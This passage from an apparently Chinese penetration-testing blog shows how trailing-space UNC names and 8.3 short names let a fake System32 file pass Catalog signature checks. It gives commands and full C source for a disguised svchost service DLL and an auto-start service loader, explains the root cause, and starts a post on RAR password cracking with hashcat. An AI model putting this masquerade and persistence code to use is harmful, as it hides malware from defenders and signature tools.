<h3 id="运行伪造文件并验证"><a href="#运行伪造文件并验证" class="headerlink" title="运行伪造文件并验证"></a>运行伪造文件并验证</h3><p>使用<code>wmic</code>结合短文件名可正常启动伪造文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\1&gt;wmic process call create C:\Windows\System32\CALC~1.exe</span><br><span class="line">Executing (Win32_Process)-&gt;Create()</span><br><span class="line">Method execution successful.</span><br><span class="line">Out Parameters:</span><br><span class="line">instance of __PARAMETERS</span><br><span class="line">&#123;</span><br><span class="line">        ProcessId = 1916;</span><br><span class="line">        ReturnValue = 0;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97%E4%BC%AA%E9%80%A0Catalog%E7%AD%BE%E5%90%8D/wmic_短文件名.png" alt="wmic_短文件名.png"></p>
<p>如果<code>wmic</code>使用Long UNC文件名，会启动正常的系统计算器：<br><img src="/2023/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97%E4%BC%AA%E9%80%A0Catalog%E7%AD%BE%E5%90%8D/wmic_unc.png" alt="wmic_unc.png"></p>
<p>直接使用Long UNC文件名无效：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\1&gt;<span class="string">&quot;\\?\C:\Windows\System32\calc.exe &quot;</span></span><br><span class="line">系统找不到指定的路径。</span><br></pre></td></tr></table></figure>
<p>直接使用短文件名，会弹出正常计算器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\1&gt;C:\Windows\System32\CALC~1.EXE</span><br></pre></td></tr></table></figure>
<p><img src="/2023/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97%E4%BC%AA%E9%80%A0Catalog%E7%AD%BE%E5%90%8D/8.3_normal.png" alt="8.3_normal.png"></p>
<p>使用ProcessExplorer验证运行的伪造文件，进程描述、厂商名称等无法欺骗，但是文件仍然通过了验证：<br><img src="/2023/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97%E4%BC%AA%E9%80%A0Catalog%E7%AD%BE%E5%90%8D/procexp_calc.png" alt="procexp_calc.png"></p>
<p>PCHunter与之类似，显示出了伪造文件的原始信息，但仍然通过了数字签名验证：<br><img src="/2023/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97%E4%BC%AA%E9%80%A0Catalog%E7%AD%BE%E5%90%8D/pchunter_fakecalc.png" alt="pchunter_fakecalc.png"></p>
<h3 id="删除伪造文件"><a href="#删除伪造文件" class="headerlink" title="删除伪造文件"></a>删除伪造文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt;del c:\Windows\System32\CALC~1.exe</span><br><span class="line">或者</span><br><span class="line">C:\WINDOWS\system32&gt;del <span class="string">&quot;\\?\C:\Windows\System32\calc.exe &quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="部分无法伪造和欺骗的功能"><a href="#部分无法伪造和欺骗的功能" class="headerlink" title="部分无法伪造和欺骗的功能"></a>部分无法伪造和欺骗的功能</h3><p>文件属性-详细信息，可以正常识别伪造文件和正常文件的信息：<br><img src="/2023/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97%E4%BC%AA%E9%80%A0Catalog%E7%AD%BE%E5%90%8D/calc属性详细信息.png" alt="calc属性详细信息.png"></p>
<p>PCHunter-模块窗口，校验模块数字签名，无法通过数字签名验证：<br><img src="/2023/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97%E4%BC%AA%E9%80%A0Catalog%E7%AD%BE%E5%90%8D/pchunter_module.png" alt="pchunter_module.png"></p>
<h2 id="扩展用法"><a href="#扩展用法" class="headerlink" title="扩展用法"></a>扩展用法</h2><p>将该方法与伪造系统服务Dll结合使用，由正常的系统进程svchost.exe加载自己的服务Dll，达到更隐蔽的伪装效果。</p>
<p>编写一个伪装为系统服务的Dll文件svchost.dll，以及服务加载器LoadSvchostDll.exe，代码如下：</p>
<p>svchost.dll代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> serviceName <span class="meta-string">L&quot;svchost&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line">HANDLE g_hModule = <span class="number">0</span>;</span><br><span class="line">SERVICE_STATUS_HANDLE hStatus = <span class="number">0</span>;</span><br><span class="line">SERVICE_STATUS ss;</span><br><span class="line">DWORD aexit;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID WINAPI <span class="title">handler</span><span class="params">(DWORD code)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    g_hModule = hModule;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">__declspec(dllexport)</span><br><span class="line"><span class="function"><span class="keyword">void</span> WINAPI <span class="title">ServiceMain</span><span class="params">(<span class="keyword">int</span> argv, <span class="keyword">wchar_t</span>* argc[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">    HANDLE file;</span><br><span class="line">    aexit = <span class="number">0</span>;</span><br><span class="line">    ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;</span><br><span class="line">    ss.dwCurrentState = SERVICE_STOPPED;</span><br><span class="line">    <span class="comment">// 设置服务可以使用的控制</span></span><br><span class="line">    <span class="comment">// 如果希望服务启动后不能停止，去掉SERVICE_ACCEPT_STOP</span></span><br><span class="line">    <span class="comment">// SERVICE_ACCEPT_PAUSE_CONTINUE是服务可以“暂停/继续”</span></span><br><span class="line">    ss.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;</span><br><span class="line">    ss.dwWin32ExitCode = <span class="number">0</span>;</span><br><span class="line">    ss.dwServiceSpecificExitCode = <span class="number">0</span>;</span><br><span class="line">    ss.dwCheckPoint = <span class="number">0</span>;</span><br><span class="line">    ss.dwWaitHint = <span class="number">0</span>;</span><br><span class="line">    hStatus = RegisterServiceCtrlHandlerW(argc[<span class="number">0</span>], handler);</span><br><span class="line">    <span class="keyword">if</span> (hStatus == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        OutputDebugString(<span class="string">L&quot;RegisterServiceCtrlHandlerW hStatus == 0&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设置为启动状态</span></span><br><span class="line">    ss.dwCurrentState = SERVICE_START_PENDING;</span><br><span class="line">    SetServiceStatus(hStatus, &amp;ss);</span><br><span class="line">    ss.dwCurrentState = SERVICE_RUNNING;</span><br><span class="line">    SetServiceStatus(hStatus, &amp;ss);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//服务运行循环</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Sleep(<span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">if</span> (aexit == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        OutputDebugString(<span class="string">L&quot;runing!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//服务循环退出后将设置退出状态</span></span><br><span class="line">    ss.dwCurrentState = SERVICE_STOPPED;</span><br><span class="line">    SetServiceStatus(hStatus, &amp;ss);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">VOID WINAPI <span class="title">handler</span><span class="params">(DWORD code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (code)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> SERVICE_CONTROL_STOP:</span><br><span class="line">        ss.dwCurrentState = SERVICE_STOP_PENDING;</span><br><span class="line">        SetServiceStatus(hStatus, &amp;ss);</span><br><span class="line"></span><br><span class="line">        ss.dwCurrentState = SERVICE_STOPPED;</span><br><span class="line">        SetServiceStatus(hStatus, &amp;ss);</span><br><span class="line">        aexit = <span class="number">1</span>;</span><br><span class="line">        OutputDebugString(<span class="string">L&quot;[hijack] service is stopped...&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> SERVICE_CONTROL_PAUSE:</span><br><span class="line">        ss.dwCurrentState = SERVICE_PAUSE_PENDING;</span><br><span class="line">        SetServiceStatus(hStatus, &amp;ss);</span><br><span class="line"></span><br><span class="line">        ss.dwCurrentState = SERVICE_PAUSED;</span><br><span class="line">        SetServiceStatus(hStatus, &amp;ss);</span><br><span class="line"></span><br><span class="line">        OutputDebugString(<span class="string">L&quot;[hijack] service is PAUSE...&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> SERVICE_CONTROL_CONTINUE:</span><br><span class="line">        ss.dwCurrentState = SERVICE_CONTINUE_PENDING;</span><br><span class="line">        SetServiceStatus(hStatus, &amp;ss);</span><br><span class="line"></span><br><span class="line">        ss.dwCurrentState = SERVICE_RUNNING;</span><br><span class="line">        SetServiceStatus(hStatus, &amp;ss);</span><br><span class="line"></span><br><span class="line">        OutputDebugString(<span class="string">L&quot;[hijack] service is CONTINUE...&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> SERVICE_CONTROL_SHUTDOWN:</span><br><span class="line">        ss.dwCurrentState = SERVICE_STOP_PENDING;</span><br><span class="line">        SetServiceStatus(hStatus, &amp;ss);</span><br><span class="line"></span><br><span class="line">        ss.dwCurrentState = SERVICE_STOPPED;</span><br><span class="line">        SetServiceStatus(hStatus, &amp;ss);</span><br><span class="line">        aexit = <span class="number">1</span>;</span><br><span class="line">        OutputDebugString(<span class="string">L&quot;[hijack] service is stopped...&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>LoadSvchostDll.exe代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> serviceName <span class="meta-string">&quot;svchost&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WserviceName <span class="meta-string">L&quot;svchost&quot;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE g_hModule = <span class="number">0</span>;</span><br><span class="line">SERVICE_STATUS_HANDLE hStatus = <span class="number">0</span>;</span><br><span class="line">SERVICE_STATUS ss = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD dwExit = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD <span class="title">Install</span><span class="params">(<span class="keyword">const</span> WCHAR* modulePath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SC_HANDLE hScm = <span class="number">0</span>;</span><br><span class="line">    SC_HANDLE hSer = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> groupName[] = <span class="string">&quot;svctest&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> fullPath[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">//WCHAR modulePath[MAX_PATH] = &#123; 0 &#125;;</span></span><br><span class="line">    HKEY hMainKey = HKEY_LOCAL_MACHINE;</span><br><span class="line">    HKEY hSubKey = <span class="number">0</span>, htemp;</span><br><span class="line">    DWORD result, lpcbMaxValueLen, valueType, valueSize, dtemp;</span><br><span class="line">    BYTE* value;</span><br><span class="line">    result = RegOpenKeyExW(hMainKey, <span class="string">L&quot;software\\microsoft\\windows nt\\currentversion\\svchost&quot;</span>, <span class="number">0</span>, KEY_SET_VALUE | KEY_QUERY_VALUE, &amp;hSubKey);</span><br><span class="line">    <span class="keyword">if</span> (result != ERROR_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    RegQueryInfoKeyW(hSubKey, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;lpcbMaxValueLen, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    value = (BYTE*)<span class="built_in">malloc</span>(lpcbMaxValueLen + <span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(value, <span class="number">0</span>, lpcbMaxValueLen + <span class="number">24</span>);</span><br><span class="line">    valueSize = lpcbMaxValueLen + <span class="number">24</span>;</span><br><span class="line">    result = RegQueryValueExA(hSubKey, groupName, <span class="number">0</span>, &amp;valueType, value, &amp;valueSize);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//找服务组,如果找到则在找是否本服务已加入,没有就加入否则退出, 如果没有找到服务组则创建服务组并向该</span></span><br><span class="line">    <span class="comment">//服务组添加本服务</span></span><br><span class="line">    <span class="keyword">if</span> (result == ERROR_SUCCESS) <span class="comment">//找到服务组</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(value + valueSize - <span class="number">1</span>, serviceName, <span class="built_in">strlen</span>(serviceName) + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">memset</span>(value + valueSize + <span class="built_in">strlen</span>(serviceName), <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//RegSetValueExW 如果值名不存在则添加,然后写入数据,注意写入数据的格式REG_MULTI_SZ与长度</span></span><br><span class="line">        result = RegSetValueExA(hSubKey, groupName, <span class="number">0</span>, REG_MULTI_SZ, (BYTE*)value, valueSize + <span class="built_in">strlen</span>(serviceName) + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">free</span>(value);</span><br><span class="line">        RegCloseKey(hSubKey);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(value, serviceName, <span class="built_in">strlen</span>(serviceName) + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">memset</span>(value + <span class="built_in">strlen</span>(serviceName) + <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        valueSize = <span class="built_in">strlen</span>(serviceName) + <span class="number">2</span>;</span><br><span class="line">        <span class="comment">//RegSetValueExW 如果值名不存在则添加,然后写入数据,注意写入数据的格式REG_MULTI_SZ与长度</span></span><br><span class="line">        result = RegSetValueExA(hSubKey, groupName, <span class="number">0</span>, REG_MULTI_SZ, (BYTE*)value, valueSize);</span><br><span class="line">        <span class="built_in">free</span>(value);</span><br><span class="line">        RegCloseKey(hSubKey);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result != ERROR_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//打开服务管理器</span></span><br><span class="line">    hScm = OpenSCManagerW(<span class="number">0</span>, <span class="number">0</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hScm == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;OpenSCManagerW error code is %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sprintf</span>(fullPath, <span class="string">&quot;c:\\windows\\system32\\svchost.exe -k %s&quot;</span>, groupName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建该服务</span></span><br><span class="line">    hSer = CreateServiceA(hScm, serviceName, serviceName, SERVICE_ALL_ACCESS, SERVICE_WIN32_SHARE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, fullPath, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hSer == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;CreateServiceW error code is %d\n&quot;</span>, GetLastError());</span><br><span class="line">        CloseServiceHandle(hScm);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(fullPath, <span class="string">&quot;system\\currentcontrolset\\services\\%s&quot;</span>, serviceName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//服务创建成功,这里就会打开</span></span><br><span class="line">    result = RegOpenKeyExA(hMainKey, fullPath, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;hSubKey);</span><br><span class="line">    <span class="keyword">if</span> (result != ERROR_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加Parameters键</span></span><br><span class="line">    result = RegCreateKeyExW(hSubKey, <span class="string">L&quot;Parameters&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, KEY_ALL_ACCESS, <span class="number">0</span>, &amp;htemp, &amp;dtemp);</span><br><span class="line">    <span class="keyword">if</span> (result != ERROR_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        RegCloseKey(hSubKey);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;<span class="comment">//给Parameters键添加值名ServiceDll, 数据就是dll路径</span></span><br><span class="line">    result = RegSetValueExW(htemp, <span class="string">L&quot;ServiceDll&quot;</span>, <span class="number">0</span>, REG_EXPAND_SZ, (PBYTE)modulePath, wcslen(modulePath) * <span class="keyword">sizeof</span>(WCHAR) + <span class="number">2</span>);</span><br><span class="line">    RegCloseKey(hSubKey);</span><br><span class="line">    RegCloseKey(htemp);</span><br><span class="line"></span><br><span class="line">    StartServiceW(hSer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hSer)    CloseServiceHandle(hSer);</span><br><span class="line">    <span class="keyword">if</span> (hScm)   CloseServiceHandle(hScm);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wmain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Install(<span class="string">L&quot;C:\\Windows\\System32\\pla~1.dll&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将恶意svchost.dll伪装为系统的pla.dll:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> svchost.dll &gt; <span class="string">&quot;\\?\C:\Windows\System32\pla.dll &quot;</span></span><br></pre></td></tr></table></figure>
<p>运行LoadSvchostDll.exe注册并加载服务，可以看到服务已运行：</p>
<p><img src="/2023/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97%E4%BC%AA%E9%80%A0Catalog%E7%AD%BE%E5%90%8D/srv_dll_running.png" alt="srv_dll_running.png"></p>
<p>使用ProcessExplorer查看，伪装很成功：<br><img src="/2023/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97%E4%BC%AA%E9%80%A0Catalog%E7%AD%BE%E5%90%8D/px_srvdll_verify.png" alt="px_srvdll_verify.png"></p>
<p>使用PCHunter查看，服务签名验证可以通过，模块文件签名验证仍然不行：<br><img src="/2023/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97%E4%BC%AA%E9%80%A0Catalog%E7%AD%BE%E5%90%8D/pchunter_srvdll_verify.png" alt="pchunter_srvdll_verify.png"></p>
<p><img src="/2023/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97%E4%BC%AA%E9%80%A0Catalog%E7%AD%BE%E5%90%8D/pchunter_srvdll_no_verify.png" alt="pchunter_srvdll_no_verify.png"></p>
<h2 id="原理浅析"><a href="#原理浅析" class="headerlink" title="原理浅析"></a>原理浅析</h2><p>以sigcheck64.exe为例，调用<code>CraeteFile</code>和<code>WinVerifyTrust</code>可以准确区分系统文件和伪装文件的路径；在使用<code>FindFirstFileW</code>函数获取路径后，文件名会保存在<code>WIN32_FIND_DATAW</code>结构体的<code>cFileName</code>成员中，但是对于Long UNC的文件名，此时<code>WIN32_FIND_DATAW.cFileName</code>保存的是带空格的文件名<code>&quot;calc.exe &quot;</code>，又因为系统会忽略末尾的空格，导致后续校验文件时，使用的是原始的计算器路径<code>C:\Windows\System32\calc.exe</code>；如果手工修改<code>WIN32_FIND_DATAW.cFileName</code>为<code>calc~1.exe</code>（或者使用能够保存短文件名的<code>cAlternateFileName</code>替代<code>cFileName</code>），就可以对伪造calc.exe的路径做校验，此时校验失败：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Sigcheck v2.90 - File version and signature viewer</span><br><span class="line">Copyright (C) 2004-2022 Mark Russinovich</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">c:\windows\system32\calc~1.exe:</span><br><span class="line">        Verified:       Unsigned</span><br><span class="line">        Link date:      10:31 2006/10/15</span><br><span class="line">        Publisher:      n/a</span><br><span class="line">        Company:        keir.net</span><br><span class="line">        Description:    File hasher</span><br><span class="line">        Product:        Hash</span><br><span class="line">        Prod version:   1, 0, 4, 0</span><br><span class="line">        File version:   1, 0, 4, 0</span><br><span class="line">        MachineType:    32-bit</span><br></pre></td></tr></table></figure>
<p>其实对比之前欺骗成功的路径，可以发现sigcheck64显示的文件路径并不是我们传递的路径：<br><img src="/2023/08/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E6%AC%BA%E9%AA%97%E4%BC%AA%E9%80%A0Catalog%E7%AD%BE%E5%90%8D/error_path.png" alt="error_path.png"></p>
<p>微软关于文件名的规定：</p>
<p><a href="https://learn.microsoft.com/zh-CN/troubleshoot/windows-client/shell-experience/file-folder-name-whitespace-characters">https://learn.microsoft.com/zh-CN/troubleshoot/windows-client/shell-experience/file-folder-name-whitespace-characters</a></p>
<blockquote>
<p>摘要</p>
<p>将保存以 ASCII 空格 (0x20) 开头或结尾的文件和文件夹名称，而不使用这些字符。 以 ASCII 周期 (0x2E) 字符结尾的文件和文件夹名称也将在没有此字符的情况下保存。 将保留所有其他尾随或前导空格字符。</p>
<p>对象管理器</p>
<p>创建时，对象管理器会删除文件或文件夹名称开头或结尾的 ASCII 空格 (0x20) 字符。</p>
<p>创建时，对象管理器会删除文件或文件夹名称末尾的 ASCII 周期 (0x2E) 字符。</p>
<p>对象管理器会保留所有其他前导或尾随空格字符。</p>
</blockquote>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>参考链接：</p>
<p><a href="https://zhuanlan.zhihu.com/p/30255849">https://zhuanlan.zhihu.com/p/30255849</a></p>
<p><a href="https://www.cnblogs.com/bonelee/p/16482684.html">https://www.cnblogs.com/bonelee/p/16482684.html</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>签名</tag>
        <tag>服务</tag>
      </tags>
  </entry>
  <entry>
    <title>用 rar2john+hashcat 破解 RAR 文件密码</title>
    <url>/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>rar2john 工具下载地址：<br><a href="http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z">http://openwall.info/wiki/_media/john/johntheripper-v1.8.0.12-jumbo-1-bleeding-e6214ceab-2018-02-07-win-x64.7z</a></p>
<p>hashcat 下载地址：<br><a href="https://hashcat.net/files/hashcat-4.1.0.7z">https://hashcat.net/files/hashcat-4.1.0.7z</a></p>
<p>下载并解压这两个工具，放到同级目录，方便以后使用，目录结构如下所示：<br>D:Tool<br>├─hashcat<br>│  ├─MyCrackRAR.bat<br>│ ├─testfile.rar<br>├─JohnTheRipper</p>
<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>testfile.rar 是测试用的文件，密码为1234。示例中的 hash 值仅演示用，并非真正的 hash。<br>1. 用 rar2john.exe 获取 rar 压缩文件的 hash 值：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">Tool</span>\<span class="title">JohnTheRipper</span>\<span class="title">run</span>&gt;<span class="title">rar2john.exe</span> <span class="title">testfile.rar</span></span></span><br><span class="line"><span class="function"><span class="title">testfile.rar</span>:$<span class="title">RAR3</span>$*0*5<span class="title">ba3dd697a8706fa</span>*919<span class="title">ad1d7a1c42bae4a8d462c8537c9cb</span>:0::::<span class="title">testfile.rar</span></span></span><br></pre></td></tr></table></figure>
<p>2. 用 hashcat 破解：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">hashcat64.exe -m <span class="number">12500</span> -a3 $RAR3$*<span class="number">0</span>*<span class="number">5</span>ba3dd697a8706fa*<span class="number">919</span>ad1d7a1c42bae4a8d462c8537c9cb ?d?d?d?d</span><br></pre></td></tr></table></figure>
<p>3. 方便起见，写一个 MyCrackRAR.bat 脚本，放在 hashcat 目录中，内容如下：</p>
